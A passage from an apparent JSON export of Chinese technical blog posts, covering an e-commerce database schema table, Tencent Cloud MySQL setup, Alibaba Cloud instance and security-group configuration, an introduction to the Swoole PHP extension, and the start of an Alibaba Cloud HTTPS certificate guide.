style=\"font-size:16px;\">备注</span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">attr_id</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">否</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">关联商品属性表ID(cs_goods_attribute)</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">attr_no</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">属性代码</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">attr_value</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">varchar(255)</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">否</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">属性值</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">is_search</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">是否需要检索：1是，0否</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">否</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p><span style=\"font-size:16px;\">创建人ID</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">否</span></p></td><td><p><span style=\"font-size:16px;\"> </span></p></td><td><p><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除)</span></p></td></tr></tbody></table><p><strong><span style=\"font-size:16px;\"><br>cs_goods_attribute_type  <span style=\"font-family:'宋体';\">商品属性与模型关联表</span></span></strong></p><p></p><table><tbody><tr><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">字段名</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">数据类型</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">默认值</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">允许非空</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">是否递增</span></span></strong></p></td><td style=\"background:rgb(222,222,222);\"><p align=\"center\"><strong><span style=\"color:rgb(51,51,51);\"><span style=\"font-size:16px;\">备注</span></span></strong></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">是</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">type_id</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">关联商品模型表ID(cs_goods_type)</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">attr_id</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">关联商品属性表ID(cs_goods_attribute)</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">create_time</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">bigint(13)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">创建时间</span></p></td></tr><tr><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">uid</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">int(11)</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td style=\"background:rgb(255,255,255);\"><p align=\"center\"><span style=\"font-size:16px;\">创建人</span></p></td></tr><tr><td><p align=\"center\"><span style=\"font-size:16px;\">is_delete</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">tinyint(1)</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">否</span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\"> </span></p></td><td><p align=\"center\"><span style=\"font-size:16px;\">伪删除状态(0,未删除1,已删除)</span></p></td></tr></tbody></table><span style=\"font-size:16px;\"><img src=\"https://img-blog.csdn.net/20180423221619395?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"\"><br></span><p><span style=\"font-size:16px;\"><br></span></p><div style=\"text-align:left;\"><span style=\"font-size:14px;\"><br></span></div>                                    </div>", "log_PostTime": 1584891050, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "腾讯云数据库", "log_Intro": "腾讯云数据库", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">1.领取或购买到腾讯云关系型数据库，根据你需要的数据库类型进行新建就会进入购买页<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/b82823b3edafb43829a2fed8379d064f_1399x409.png\" style=\"border:0px none;vertical-align:top;\"></span></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">2.刚购买的数据库都要进行初始化操作，就是点按钮选择你要的类型<br style=\"margin:.2em;\">3.对数据库进行管理，点击管理<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/8703c12b9dbb3a253c9952bb42538001_1221x183.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/e4305717c2e970e70e2e8ad17f0a0cfb_1187x629.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4.忘记密码的可以在账号管理进行数据库密码重置，然后就是将我们需要的数据库文件导入，在数据库管理中新增数据库，将SQL文件导入，根据文件大小和网络上传速度等待时间有长短<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/a80529f9c59d18050f2a2b750d68e845_1220x680.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/88868236bd1d6a91ef13c7e525423390_1186x676.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.完成后可以通过登录按钮使用phpmyadmin查看数据内容<br style=\"margin:.2em;\">在 腾讯云控制台 中，依次单击【云产品】&gt;【关系型数据库】&gt;【MySQL】&gt;【实例列表】，选择状态为运行中的目标实例，点击【登录】。</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">在数据管理控制台的登录界面，帐号输入 root，密码为之前在初始化选项中配置的 root 账户的密码，点击【登录】来登录。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/507828b2732bcb9ff5b3dc6bfb94afe2_404x450.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">在数据管理页面可以查看实例的状态和基本信息。点击【返回PMA】访问数据库。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/2c8c1b0961a71d6a66d21e850003380b_727x452.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">您现在已经通过 phpMyAdmin 成功连接到 MySQL 数据库，在此页面上您可以看到 MySQL 数据库的各种模式和对象，您可以开始创建表，进行数据插入和查询等操作。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/7871a92de8f041afbb8b15bec64ac9b0_795x419.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">当然你可以直接在phpmyadmin操作数据导入导出等操作</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.同账号下同区的云服务器里面的项目需要访问云数据，只需要将访问数据库的配置文件修改成内网地址，以及账号密码写对就可以了</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/3f850ea2f167c514c630cb05a2d0acc4_835x645.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;background-color:rgb(255,255,255);\"><br></p>                                    </div>", "log_PostTime": 1584891051, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "阿里云实例配置", "log_Intro": "阿里云实例配置", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>阿里云服务器实例设置</strong><br style=\"margin:.2em;\">1.购买或领取免费的阿里云，购买时都会选择系统和配置，当前个人可以领取1个月免费的阿里云服务器</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">2.在控制台的云服务器选实例，找到自己购买区（华南1）下面的实例，重置密码，这个密码就是用来给putty等ssh工具进行访问服务器、搭建环境用的。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/2af764dfebb39d31a649026d921c19aa_1416x582.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">3.使用putty等工具通过IP地址进行搭建环境操作，搭建教程请 看lnmp一键安装（也包含有apache）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><a href=\"https://blog.csdn.net/xiaoweite1/article/details/80035423\">https://blog.csdn.net/xiaoweite1/article/details/80035423</a><br></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">4.搭建完成你会发现通过IP地址访问失败，原因为阿里云服务器的端口需要设置安全组，同样是在实例---更多---安全设置<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/82b945da278310a265fe21a2feb073c0_1392x665.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">5.在安全组设置里添加安全规则，可以理解成就是打开服务器端口<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/c6b000a5af714342559f136f8861b3bb_1423x462.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">6.设置完成，再通过IP访问就可以看到你的LNMPA</span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/4b0f3061ac5849b2fa51f05a9ad0031c_1312x684.png\" style=\"border:0px none;vertical-align:top;\"></span></p>                                    </div>", "log_PostTime": 1584891052, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Swoole入门介绍", "log_Intro": "Swoole入门介绍", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>Swoole</strong>虽然是标准的PHP扩展，实际上与普通的扩展不同。普通的扩展只是提供一个库函数。而swoole扩展在运行后会接管PHP的控制权，进入事件循环。当IO事件发生后，swoole会自动回调指定的PHP函数。</span></p><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:18px;\"><strong>新手入门教程：</strong></span><a href=\"https://github.com/LinkedDestiny/swoole-doc\" style=\"font-size:18px;color:rgb(66,139,202);\">https://github.com/LinkedDestiny/swoole-doc</a></p><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><strong>Swoole</strong>要求使用者必须具备一定的Linux/Unix环境编程基础，<span style=\"color:#428bca;\">学习Swoole需要掌握哪些基础知识</span> 本文列出了基础知识清单。</span></p><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_server</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">强大的TCP/UDP Server框架，多线程，EventLoop，事件驱动，异步，Worker进程组，Task异步任务，毫秒定时器，SSL/TLS隧道加密。</span></p><ul style=\"padding-left:30px;margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><li><span style=\"font-size:16px;\"><code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_http_server</code>是<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_server</code>的子类，内置了Http的支持</span></li><li><span style=\"font-size:16px;\"><code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_websocket_server</code>是<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_http_server</code>的子类，内置了WebSocket的支持</span></li><li><span style=\"font-size:16px;\"><code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_redis_server</code>是<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">swoole_server</code>的子类，内置了Redis服务器端协议的支持</span></li></ul><blockquote style=\"margin-bottom:20px;padding:0px 15px;border-left:4px solid #008000;color:#008000;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><p style=\"margin-bottom:0px;line-height:25.2px;\"><span style=\"font-size:16px;\">子类可以调用父类的所有方法和属性</span></p></blockquote><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_client</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">TCP/UDP/UnixSocket</code>客户端，支持<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">IPv4/IPv6</code>，支持<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">SSL/TLS</code>隧道加密，支持<code style=\"font-family:Consolas, 'Liberation Mono', Courier, monospace;padding:0px 5px;color:rgb(51,51,51);white-space:nowrap;background:rgb(248,248,248);border:1px solid rgb(221,221,221);margin:0px 2px;\">SSL</code>双向证书，支持同步并发调用，支持异步事件驱动编程。</span></p><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_event</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">EventLoop API，让用户可以直接操作底层的事件循环，将socket，stream，管道等Linux文件加入到事件循环中。</span></p><blockquote style=\"margin-bottom:20px;padding:0px 15px;border-left:4px solid #008000;color:#008000;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><p style=\"margin-bottom:0px;line-height:25.2px;\"><span style=\"font-size:16px;\">eventloop接口仅可用于socket类型的文件描述符，不能用于磁盘文件读写</span></p></blockquote><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_async</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">异步IO接口，提供了 异步文件系统IO，定时器，异步DNS查询，异步MySQL等API，异步Http客户端，异步Redis客户端。</span></p><ul style=\"padding-left:30px;margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><li><span style=\"font-size:16px;\">swoole_timer 异步毫秒定时器，可以实现间隔时间或一次性的定时任务</span></li><li><span style=\"font-size:16px;\">swoole_async_read/swoole_async_write 文件系统操作的异步接口</span></li></ul><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_process</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">进程管理模块，可以方便的创建子进程，进程间通信，进程管理。</span></p><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_buffer</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">强大的内存区管理工具，像C一样进行指针计算，又无需关心内存的申请和释放，而且不用担心内存越界，底层全部做好了。</span></p><h2 style=\"margin-top:1em;margin-bottom:15px;line-height:1.7;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;padding:0px;border-bottom:1px solid rgb(238,238,238);color:rgb(51,51,51);background-color:rgb(255,255,255);\"><span style=\"font-size:24px;\">swoole_table</span></h2><p style=\"margin-top:15px;margin-bottom:15px;color:rgb(51,51,51);font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">基于共享内存和自旋锁实现的超高性能内存表。彻底解决线程，进程间数据共享，加锁同步等问题。</span></p><blockquote style=\"padding:0px 15px;border-left:4px solid #008000;color:#008000;font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;background-color:rgb(255,255,255);margin-bottom:0px;\"><p style=\"margin-bottom:0px;line-height:25.2px;\"><span style=\"font-size:16px;\">swoole_table的性能可以达到单线程每秒读写100W次</span></p></blockquote>                                    </div>", "log_PostTime": 1584891054, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "阿里云https认证", "log_Intro": "阿里云https认证", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">1.登录阿里云服务器，在控制台上选择 安全（云盾）---CA证书服务（数据安全）</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/3fd910a36b76a9f7fe1a44033b006080_1432x670.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">2.点击购买证书--（阿里把免费的隐藏起来了，这显得很不厚道）默认都是付费的，如果要免费的需要先选择 品牌 Symantec，然后选择证书类型 增强型OV SSL<br style=\"margin:.2em;\">这时候你就会发现免费的跑出来了，我也是一个一个点发现的。这个设置还是有点贱的<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/6fe780885b50b02e3f972985b4575efb_1369x682.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/3845d8e3ce03306892601b827b716404_1247x693.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/7e1baac1145083ecfc6a93904f4e3637_1305x749.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, 